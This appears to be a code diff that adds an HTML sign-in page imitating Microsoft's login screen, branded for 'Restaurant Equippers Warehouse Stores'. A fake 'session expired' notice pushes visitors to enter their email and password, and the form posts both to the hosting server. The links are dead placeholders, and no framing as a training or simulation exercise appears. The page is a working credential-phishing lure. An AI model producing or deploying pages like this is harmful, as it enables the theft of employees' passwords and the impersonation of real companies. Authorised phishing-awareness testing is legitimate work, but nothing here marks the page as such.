@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 50%, #f0f0f0 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background: #ffffff;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 440px;
+            max-width: 440px;
+        }
+
+        .company-banner {
+            background: #cc0000;
+            padding: 12px 20px;
+            margin: -44px -44px 30px -44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .company-logo {
+            max-height: 50px;
+        }
+
+        .company-name {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .company-name span {
+            display: block;
+            font-size: 12px;
+            font-weight: normal;
+            letter-spacing: 2px;
+        }
+
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .microsoft-logo svg {
+            width: 108px;
+            height: 24px;
+        }
+
+        .ms-squares {
+            display: grid;
+            grid-template-columns: 10px 10px;
+            grid-template-rows: 10px 10px;
+            gap: 2px;
+            margin-right: 8px;
+        }
+
+        .ms-squares div:nth-child(1) { background: #f25022; }
+        .ms-squares div:nth-child(2) { background: #7fba00; }
+        .ms-squares div:nth-child(3) { background: #00a4ef; }
+        .ms-squares div:nth-child(4) { background: #ffb900; }
+
+        .ms-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #5e5e5e;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+
+        .session-notice {
+            background: #fff4ce;
+            border-left: 4px solid #ffb900;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #5e5e5e;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: none;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: none;
+            border-bottom: 1px solid #666;
+            font-size: 15px;
+            outline: none;
+            background: transparent;
+        }
+
+        .form-group input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+
+        .form-group input::placeholder {
+            color: #666;
+        }
+
+        .links {
+            margin: 16px 0 24px 0;
+        }
+
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+            color: #004578;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .btn-next {
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 40px;
+            font-size: 15px;
+            cursor: pointer;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .btn-next:hover {
+            background: #005a9e;
+        }
+
+        .sign-in-options {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e5e5;
+            text-align: center;
+        }
+
+        .sign-in-options a {
+            color: #5e5e5e;
+            text-decoration: none;
+            font-size: 13px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .key-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        .footer-text {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 11px;
+            color: #5e5e5e;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="company-banner">
+            <div class="company-name">
+                RESTAURANT<br>EQUIPPERS
+                <span>WAREHOUSE STORES</span>
+            </div>
+        </div>
+
+        <div class="microsoft-logo">
+            <div class="ms-squares">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+            <span class="ms-text">Microsoft</span>
+        </div>
+
+        <h1>Sign in</h1>
+
+        <div class="session-notice">
+            Your session has expired. Please sign in again to reset your password.
+        </div>
+
+        <form method="POST" action="">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+
+            <div class="links">
+                <a href="#">Forgot my password</a>
+                <a href="#">Sign-in options</a>
+            </div>
+
+            <div class="button-container">
+                <button type="submit" class="btn-next">Sign in</button>
+            </div>
+        </form>
+
+        <div class="sign-in-options">
+            <a href="#">
+                <svg class="key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="8" cy="15" r="4"/>
+                    <line x1="10.5" y1="12.5" x2="19" y2="4"/>
+                    <line x1="16" y1="7" x2="19" y2="4"/>
+                    <line x1="19" y1="4" x2="19" y2="7"/>
+                    <line x1="19" y1="4" x2="16" y2="4"/>
+                </svg>
+                Sign-in options
+            </a>
+        </div>
+    </div>
+
+    <div class="footer-text">Terms of use &nbsp; Privacy & cookies</div>
+</body>
+</html>
